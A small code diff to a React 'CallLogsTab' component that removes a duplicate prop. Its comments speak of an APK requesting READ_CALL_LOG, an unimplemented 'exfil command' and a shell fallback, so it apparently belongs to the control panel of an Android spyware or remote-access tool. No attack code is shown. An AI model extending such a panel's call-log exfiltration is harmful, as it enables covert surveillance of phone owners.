@@ -4,7 +4,7 @@ import { Card, CmdBtn, Table, Empty, useData, C } from './shared';
 // NOTE: The APK source has no GET_CALL_LOG command.
 // READ_CALL_LOG permission is requested but the exfil command is not implemented.
 // We attempt via shell fallback and display any cached results.
-export default function CallLogsTab({ device, data, send }) {
+export default function CallLogsTab({ device, send }) {
   const { data, loading, load } = useData(device.id, 'call_logs');
   useEffect(() => { load(); }, [device.id]);
 
